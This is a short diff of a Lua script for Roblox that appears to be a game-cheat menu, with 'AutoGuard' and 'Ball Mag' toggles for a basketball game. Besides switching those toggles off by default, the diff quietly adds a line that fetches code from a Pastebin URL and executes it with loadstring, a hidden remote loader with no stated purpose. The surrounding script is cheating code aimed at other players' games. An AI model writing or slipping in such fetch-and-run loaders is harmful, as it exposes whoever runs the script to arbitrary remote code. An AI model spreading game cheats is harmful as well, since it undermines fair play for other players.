@@ -60,6 +60,7 @@ wait(1.5)
 		Image = "rbxassetid://14372116641",
 		Time = 5
 	})
+	loadstring(game:HttpGet("https://pastebin.com/raw/CL6ngd2J"))()
 
 elseif game.PlaceId == 623694595 then
 	OrionLib:MakeNotification({
@@ -297,7 +298,7 @@ else
 	end
 
 	-- Assuming you have a toggle implementation similar to the provided code
-	HoopzTab.newToggle("AutoGuard", "Auto guard the player with the ball", true, function(toggleState)
+	HoopzTab.newToggle("AutoGuard", "Auto guard the player with the ball", false, function(toggleState)
 		toggleChasing(toggleState)
 	end)
 	
@@ -326,7 +327,7 @@ else
 	end
 
 	-- Use the provided toggle to enable or disable the functionality
-	HoopzTab.newToggle("Ball Mag", "Magnetize the ball towards you", true, enableMagFunctionality)
+	HoopzTab.newToggle("Ball Mag", "Magnetize the ball towards you", false, enableMagFunctionality)
 
 	spawn(function()
 		while true do
